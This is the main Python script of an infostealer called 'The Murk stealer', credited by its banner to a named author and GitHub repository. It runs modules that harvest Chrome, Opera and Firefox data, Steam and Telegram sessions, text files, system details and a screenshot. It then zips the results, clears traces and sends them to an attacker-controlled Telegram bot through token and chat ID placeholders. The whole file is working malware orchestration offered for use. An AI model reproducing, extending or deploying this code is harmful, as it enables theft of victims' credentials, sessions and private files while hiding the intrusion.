#-----------------------------------------------------------------------------#
#████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗#
#╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝#
#░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░#
#░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░#
#░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗#
#░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝#
#                        by: Nick_Vinesmoke                                   #
#                 https://github.com/Nick-Vinesmoke                           #
#         https://github.com/Nick-Vinesmoke/The-Murk-stealer                  #
#-----------------------------------------------------------------------------#
userTOKEN = ''
userCHAT_ID = ''






from scripts.send import make_folder
from scripts.system import system_info
from scripts.system import screenshoot
from scripts.browsers import chrome
from scripts.browsers import opera
from scripts.browsers import firefox
from scripts.another import telegram
from scripts.send import send
from scripts.removal_of_traces import clear
from scripts.another import steam
from scripts.system import Files_txt



make_folder.makeFolders()
chrome.Chrome()
opera.Opera()
firefox.Firefox()
steam.Steam()
system_info.SystemInfo()
Files_txt.TxtSteal()
telegram.Telegram()
screenshoot.Screenshot()

try:
    clear.makemeZip()
except Exception as e:
    print(e)
try:
    send.Send(userTOKEN,userCHAT_ID)
except Exception as e:
    print(e)